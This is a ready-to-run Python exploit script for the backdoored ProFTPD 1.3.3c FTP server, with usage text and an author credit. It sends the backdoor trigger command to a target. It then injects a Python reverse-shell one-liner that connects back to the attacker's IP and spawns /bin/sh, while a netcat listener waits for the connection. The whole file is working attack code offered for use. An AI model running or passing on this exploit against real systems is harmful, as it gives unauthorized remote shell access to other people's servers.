import socket
import sys
import time
import subprocess
from threading import Thread
from termcolor import cprint


class Main():
    def __init__(self):
        try:
            self.lhost = sys.argv[1]
            self.rhost = sys.argv[2]
            try:
                self.rport = int(sys.argv[3])
            except:
                self.rport = 21

        except:
            self.help()

        try:
            Thread(target=self.exploit, args=("Thread-1",)).start()
            Thread(target=self.shell, args=("Thread-2",)).start()

        except:
            self.error()


    def exploit(self, threadName):
        time.sleep(2)
        cprint("[+] Sending payload",color="green")
        s = socket.socket()
        s.connect((self.rhost,self.rport))        
        greeting = s.recv(1024).decode("utf-8")
        cprint("[+] Activating the backdoor\n",color="green")

        time.sleep(2)
        s.send("HELP ACIDBITCHEZ\n".encode())
        time.sleep(2)

        cmd = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n'.format(self.lhost)
        s.send(cmd.encode())        
        s.close()


    def shell(self, threadName):
        cprint("/\/\/\/\ Starting Handler /\/\/\/\/\n", color="green")
        subprocess.call("nc -lvnp 1234", shell=True)
    

    def error(self):
        cprint('''
ERROR
=====

> Make sure you have submit the correct arguments
> Target may not be vulnerable
            ''',color="red")
        
        self.help()

    def help(self):
        cprint('''
USAGE:
    
    python3 proFTPD_1.3.3c_exploit.py <Attacker-IP> <Target-IP> <Target Port (Optional)>

Note: If Target-Port argumant is empty port 21 will be used by default.


( Created By ) => { Shafdo }
        ''',color="white")
        sys.exit()


if __name__ == "__main__":
    main = Main()








